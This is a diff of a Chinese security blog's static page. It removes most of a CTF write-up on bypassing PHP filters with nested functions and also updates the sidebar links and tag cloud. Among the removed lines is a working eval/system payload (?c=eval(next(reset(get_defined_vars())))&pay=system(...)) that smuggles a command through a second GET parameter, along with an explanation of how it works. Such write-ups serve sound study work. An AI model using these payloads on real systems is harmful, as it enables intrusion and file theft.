-<td align="left">新位置的值（越界返回 <code>false</code>）</td>
-</tr>
-<tr>
-<td align="left"><code>prev()</code></td>
-<td align="left">是（前移）</td>
-<td align="left">新位置的值（越界返回 <code>false</code>）</td>
-</tr>
-<tr>
-<td align="left"><code>reset()</code></td>
-<td align="left">是（重置）</td>
-<td align="left">数组第一个元素（空数组返回 <code>false</code>）</td>
-</tr>
-<tr>
-<td align="left"><code>end()</code></td>
-<td align="left">是（跳末）</td>
-<td align="left">数组最后一个元素（空数组返回 <code>false</code>）</td>
-</tr>
-<tr>
-<td align="left"><code>key()</code></td>
-<td align="left">否</td>
-<td align="left">当前指针位置的键名（越界返回 <code>null</code>）</td>
-</tr>
-</tbody></table>
-</li>
-<li><p><strong><code>highlight_file(&#39;flag.php&#39;)</code></strong><br>高亮显示<code>flag.php</code>的源码，直接输出文件内容。</p>
-</li>
-</ol>
-<p>最终 flag.php 回显到前端。若输出的不是 flag.php 文件的内容，可能需要自行移动指针位置来找找。</p>
-<h2 id="Payload2"><a href="#Payload2" class="headerlink" title="Payload2"></a>Payload2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=eval(next(reset(get_defined_vars())));&amp;pay=system(&quot;tac flag.php&quot;); </span><br></pre></td></tr></table></figure>
-
-<p><strong>解析</strong></p>
-<p><code>get_defined_vars()</code>：返回当前作用域中所有变量的数组，包括超全局变量（如<code>$_GET</code>）。<br><strong>超全局变量（如 <code>$_GET</code>、<code>$_POST</code>、<code>$_SERVER</code> 等）默认位于返回数组的最前端</strong>。它们会以固定的顺序排列，但具体顺序由 PHP 内核决定，第一个通常是 <code>$_GET</code> 。<br><strong>用户定义的变量（如 <code>$a = 1;</code>）会紧随超全局变量之后</strong>。它们的排列顺序通常与代码中的定义顺序一致，但某些情况下可能受 PHP 优化影响（例如变量未使用时可能被忽略）。</p>
-<p>其他数组指针操作函数参考上面的表格。于是得到层叠函数执行的过程：</p>
-<p><code>get_defined_vars()</code> 函数返回变量数组；</p>
-<p><code>reset()</code> 函数操作变量数组，返回第一个元素 <code>$_GET</code> ；（由于数组内部指针初始指向第一个元素，所以此处也可以用 <code>pos()/current()</code>）</p>
-<p><code>next()</code> 函数操作 <code>$_GET</code> 数组， <code>$_GET</code> 数组的元素顺序按照 URL 中参数顺序排列，所以返回 <code>$_GET</code> 数组中第二个参数 <code>pay</code> 的值；</p>
-<p>最后 <code>eval()</code> 函数会执行 <code>pay</code> 的值 <code>system(&quot;tac flag.php&quot;);</code> 。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/15/%E5%A4%9A%E5%B1%82%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/" data-id="cm9wk5w6m0016t0uh8tskawjd" data-title="多层函数绕过过滤" class="article-share-link"><span class="fa fa-share">分享</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
 
     </footer>
   </div>
@@ -1209,7 +1175,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">标签云</h3>
     <div class="widget tagcloud">
-      <a href="/tags/Cookie/" style="font-size: 10px;">Cookie</a> <a href="/tags/PHP/" style="font-size: 20px;">PHP</a> <a href="/tags/Python/" style="font-size: 12.5px;">Python</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/Session/" style="font-size: 15px;">Session</a> <a href="/tags/URL/" style="font-size: 10px;">URL</a> <a href="/tags/requests/" style="font-size: 10px;">requests</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 10px;">信息收集</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 20px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 17.5px;">文件包含</a> <a href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 17.5px;">杂项知识点</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 15px;">爆破</a> <a href="/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/" style="font-size: 10px;">面向对象</a>
+      <a href="/tags/Cookie/" style="font-size: 10px;">Cookie</a> <a href="/tags/PHP/" style="font-size: 20px;">PHP</a> <a href="/tags/Python/" style="font-size: 11.67px;">Python</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/Session/" style="font-size: 13.33px;">Session</a> <a href="/tags/URL/" style="font-size: 10px;">URL</a> <a href="/tags/requests/" style="font-size: 10px;">requests</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 10px;">信息收集</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 18.33px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 15px;">文件包含</a> <a href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 16.67px;">杂项知识点</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 13.33px;">爆破</a> <a href="/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/" style="font-size: 10px;">面向对象</a>
     </div>
   </div>
 
@@ -1231,6 +1197,14 @@
       <ul>
         
           <li>
+            <a href="/2025/04/25/GET%E4%B8%8EPOST%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/">$_GET 与 $_POST 数组相关知识</a>
+          </li>
+        
+          <li>
+            <a href="/2025/04/25/filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die%EF%BC%88Web87%EF%BC%89/">filter 伪协议绕过 die（Web87）</a>
+          </li>
+        
+          <li>
             <a href="/2025/04/25/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%8F%98%E4%BD%93%E9%A2%98%E7%9B%AE/">条件竞争变体题目</a>
           </li>
         
@@ -1240,14 +1214,6 @@
         
           <li>
             <a href="/2025/04/22/Python-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%85%A5%E9%97%A8/">Python-面向对象入门</a>
-          </li>
-        
-          <li>
-            <a href="/2025/04/20/Session/">Session</a>
-          </li>
-        
-          <li>
-            <a href="/2025/04/19/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/">条件竞争漏洞与 Session 的文件上传进度追踪功能</a>
           </li>
         
       </ul>
